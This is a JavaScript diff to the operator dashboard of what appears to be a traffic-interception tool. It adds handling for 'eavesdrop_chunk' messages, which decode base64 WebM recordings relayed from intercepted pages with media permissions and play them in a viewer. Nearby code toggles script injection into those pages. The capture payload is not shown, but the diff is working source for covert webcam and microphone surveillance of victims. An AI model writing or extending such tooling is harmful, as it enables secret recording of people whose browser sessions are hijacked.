@@ -1101,6 +1101,8 @@ function connect() {
       applyInjectState(msg.enabled, msg.script);
     } else if (msg.type === 'eavesdrop_state') {
       edropApplyState(msg.enabled);
+    } else if (msg.type === 'eavesdrop_chunk') {
+      edropHandleChunk(msg.data);
     }
   };
 }
@@ -1300,12 +1302,8 @@ const $btnEdropDis  = document.getElementById('btn-edrop-disable');
 const $edropVideo   = document.getElementById('eavesdrop-video');
 const $edropPh      = document.getElementById('eavesdrop-placeholder');
 
-let edropActive    = false;
-let edropWs        = null;
-let edropMs        = null;
-let edropSb        = null;
-let edropBuf       = [];
-let edropHasStream = false;
+let edropActive  = false;
+let edropPrevUrl = null;
 
 function edropApplyState(enabled) {
   edropActive = enabled;
@@ -1318,66 +1316,35 @@ function edropApplyState(enabled) {
     ? 'Active — awaiting stream from an intercepted page with media permissions'
     : 'Inactive';
   $edropHint.style.color = enabled ? 'var(--red)' : 'var(--text-dim)';
-
-  if (enabled) {
-    edropConnect();
-  } else {
-    if (edropWs) { edropWs.close(); edropWs = null; }
-    edropHasStream = false;
+  if (!enabled) {
     $edropPh.style.display = '';
     $edropVideo.src = '';
+    if (edropPrevUrl) { URL.revokeObjectURL(edropPrevUrl); edropPrevUrl = null; }
   }
 }
 
-function edropConnect() {
-  if (edropWs && edropWs.readyState < 2) return;
-  edropBuf = [];
-  edropMs  = null;
-  edropSb  = null;
+// Called when the backend relays a base64-encoded WebM blob
+function edropHandleChunk(b64) {
+  if (!edropActive) return;
+  try {
+    // Decode base64 → binary string → Uint8Array
+    const bin = atob(b64);
+    const buf = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
 
-  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-  edropWs = new WebSocket(`${proto}//${location.host}/api/eavesdrop/view`);
-  edropWs.binaryType = 'arraybuffer';
+    $edropPh.style.display = 'none';
 
-  edropWs.onopen = () => {
-    edropMs = new MediaSource();
-    $edropVideo.src = URL.createObjectURL(edropMs);
-    edropMs.addEventListener('sourceopen', () => {
-      const mimes = [
-        'video/webm; codecs="vp8, opus"',
-        'video/webm; codecs="vp9, opus"',
-        'video/webm',
-        'audio/webm; codecs="opus"',
-        'audio/webm',
-      ];
-      const mime = mimes.find(m => MediaSource.isTypeSupported(m)) || 'video/webm';
-      try {
-        edropSb = edropMs.addSourceBuffer(mime);
-        edropSb.mode = 'sequence';
-        edropSb.addEventListener('updateend', edropFlush);
-        edropFlush(); // drain any chunks that arrived before sourceopen
-      } catch(_) {}
-    });
-  };
+    const blob = new Blob([buf], { type: 'video/webm' });
+    const url  = URL.createObjectURL(blob);
 
-  edropWs.onmessage = ({ data }) => {
-    if (!(data instanceof ArrayBuffer)) return;
-    if (!edropHasStream) {
-      edropHasStream = true;
-      $edropPh.style.display = 'none';
-    }
-    edropBuf.push(data);
-    edropFlush();
-  };
+    $edropVideo.src = url;
+    $edropVideo.play().catch(() => {});
 
-  edropWs.onclose = () => {
-    if (edropActive) setTimeout(edropConnect, 2000);
-  };
-}
-
-function edropFlush() {
-  if (!edropSb || edropSb.updating || !edropBuf.length) return;
-  try { edropSb.appendBuffer(edropBuf.shift()); } catch(_) { edropBuf = []; }
+    // Revoke previous URL after playback ends or after a safety timeout
+    const prev = edropPrevUrl;
+    if (prev) setTimeout(() => URL.revokeObjectURL(prev), 10000);
+    edropPrevUrl = url;
+  } catch (_) {}
 }
 
 async function sendEdropState(enabled) {
